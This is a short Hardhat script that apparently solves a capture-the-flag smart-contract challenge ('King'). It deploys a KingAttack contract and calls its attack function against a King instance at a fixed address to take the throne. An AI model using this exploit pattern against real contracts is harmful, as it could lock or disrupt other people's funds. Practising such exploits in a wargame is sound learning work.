import { ethers } from "hardhat";
import { King__factory } from "../typechain/factories/contracts/King__factory";
import { KingAttack__factory } from "../typechain/factories/contracts/KingAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x6E92E17B18F65ab8E28168C5d27A5A1151F9F0e3";
    let king = new King__factory(signer).attach(instance_address);
    console.log(ethers.utils.formatEther(await king.prize()))
    console.log(await king._king());


    let attack = await new KingAttack__factory(signer).deploy();
    await attack.deployed();
    console.log(attack.address);

    let tx = await attack.attack(king.address, {value:ethers.utils.parseEther("0.0011"), gasLimit:80000});
    await tx.wait();
    console.log(await king._king());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
